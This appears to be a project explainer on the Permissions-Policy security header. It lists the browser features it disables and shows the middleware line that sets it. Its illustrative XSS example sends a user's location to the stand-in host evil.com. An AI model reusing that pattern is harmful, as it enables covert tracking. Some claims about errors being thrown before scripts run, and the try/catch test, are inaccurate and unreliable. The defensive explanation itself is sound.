# Permissions-Policy Explained

## What is Permissions-Policy?

**Permissions-Policy** (formerly Feature-Policy) is a security header that tells browsers which browser features and APIs your website is allowed to use. It's a **defense-in-depth** security measure that reduces your attack surface by disabling features you don't need.

## Why It Matters

Even if your application doesn't explicitly use certain browser features, malicious scripts or compromised dependencies could try to access them. Permissions-Policy prevents this by explicitly denying access at the browser level.

## What Each Feature Does

### `geolocation=()`
- **What it is**: Browser's location API
- **Why disable**: Your app doesn't need user location
- **Attack risk**: Malicious scripts could track user location
- **Impact**: ✅ Prevents location tracking

### `microphone=()`
- **What it is**: Browser's microphone access API
- **Why disable**: Your app doesn't use voice input
- **Attack risk**: Malicious scripts could record audio
- **Impact**: ✅ Prevents unauthorized audio recording

### `camera=()`
- **What it is**: Browser's camera access API
- **Why disable**: Your app doesn't use camera (photos are uploaded, not captured)
- **Attack risk**: Malicious scripts could take photos/videos
- **Impact**: ✅ Prevents unauthorized camera access

### `payment=()`
- **What it is**: Payment Request API (Web Payments)
- **Why disable**: Your app doesn't process payments
- **Attack risk**: Malicious scripts could trigger payment requests
- **Impact**: ✅ Prevents unauthorized payment requests

### `usb=()`
- **What it is**: WebUSB API (access to USB devices)
- **Why disable**: Your app doesn't need USB device access
- **Attack risk**: Malicious scripts could access USB devices
- **Impact**: ✅ Prevents USB device access

### `magnetometer=()`
- **What it is**: Device orientation sensor (magnetometer)
- **Why disable**: Your app doesn't need device orientation
- **Attack risk**: Could be used for device fingerprinting
- **Impact**: ✅ Prevents device fingerprinting

### `gyroscope=()`
- **What it is**: Device rotation sensor (gyroscope)
- **Why disable**: Your app doesn't need rotation data
- **Attack risk**: Could be used for device fingerprinting
- **Impact**: ✅ Prevents device fingerprinting

### `accelerometer=()`
- **What it is**: Device motion sensor (accelerometer)
- **Why disable**: Your app doesn't need motion data
- **Attack risk**: Could be used for device fingerprinting
- **Impact**: ✅ Prevents device fingerprinting

### `interest-cohort=()`
- **What it is**: FLoC (Federated Learning of Cohorts) - Google's privacy sandbox
- **Why disable**: Privacy protection, prevents tracking
- **Attack risk**: Could be used for user tracking/profiling
- **Impact**: ✅ Prevents FLoC tracking

## How It Works

When you set `geolocation=()`, you're telling the browser:
- **`()`** means "deny for all origins" (including your own)
- The browser will **block** any attempt to access geolocation
- This happens **before** JavaScript even runs

## Real-World Example

**Without Permissions-Policy:**
```javascript
// Malicious script injected via XSS
navigator.geolocation.getCurrentPosition((position) => {
  // Sends user location to attacker's server
  fetch('https://evil.com/track', {
    method: 'POST',
    body: JSON.stringify(position)
  })
})
// ✅ Works - location is tracked
```

**With Permissions-Policy (`geolocation=()`):**
```javascript
// Same malicious script
navigator.geolocation.getCurrentPosition((position) => {
  // ...
})
// ❌ BLOCKED - Browser throws error before script runs
// Error: "geolocation has been disabled by Permissions-Policy"
```

## Security Benefits

1. **Reduces Attack Surface**: Fewer APIs = fewer attack vectors
2. **Prevents Feature Abuse**: Stops malicious scripts from using features
3. **Privacy Protection**: Prevents tracking and fingerprinting
4. **Defense-in-Depth**: Works even if other security measures fail
5. **Zero Performance Impact**: Browser-level enforcement (no runtime cost)

## What Features Could You Enable?

If you needed certain features, you could enable them:

```typescript
// Example: Allow camera for your domain only
'Permissions-Policy': 'camera=(self "https://your-domain.com")'

// Example: Allow geolocation for specific origins
'Permissions-Policy': 'geolocation=(self "https://maps.google.com")'
```

But for your app, **disabling everything** is the right choice because:
- ✅ You don't use any of these features
- ✅ Reduces attack surface
- ✅ Better privacy for users
- ✅ No downside

## Comparison: Before vs. After

| Feature | Before | After |
|---------|--------|-------|
| Location Tracking | ⚠️ Possible | ✅ Blocked |
| Camera Access | ⚠️ Possible | ✅ Blocked |
| Microphone Access | ⚠️ Possible | ✅ Blocked |
| Payment Requests | ⚠️ Possible | ✅ Blocked |
| USB Device Access | ⚠️ Possible | ✅ Blocked |
| Device Fingerprinting | ⚠️ Possible | ✅ Blocked |
| FLoC Tracking | ⚠️ Possible | ✅ Blocked |

## Implementation

**Location**: `app/middleware.ts`

```typescript
response.headers.set(
  'Permissions-Policy',
  'geolocation=(), microphone=(), camera=(), payment=(), usb=(), magnetometer=(), gyroscope=(), accelerometer=(), interest-cohort=()'
)
```

## Testing

You can test if Permissions-Policy is working:

```javascript
// In browser console
try {
  navigator.geolocation.getCurrentPosition(() => {})
} catch (e) {
  console.log('Geolocation blocked:', e.message)
  // Should see: "geolocation has been disabled by Permissions-Policy"
}
```

## References

- [MDN Permissions-Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/Permissions_Policy)
- [W3C Permissions Policy](https://www.w3.org/TR/permissions-policy-1/)
- [OWASP Security Headers](https://owasp.org/www-project-secure-headers/)

---

**Summary**: Permissions-Policy is a security header that disables browser features you don't need, preventing malicious scripts from accessing them. It's a defense-in-depth measure that reduces your attack surface and protects user privacy.

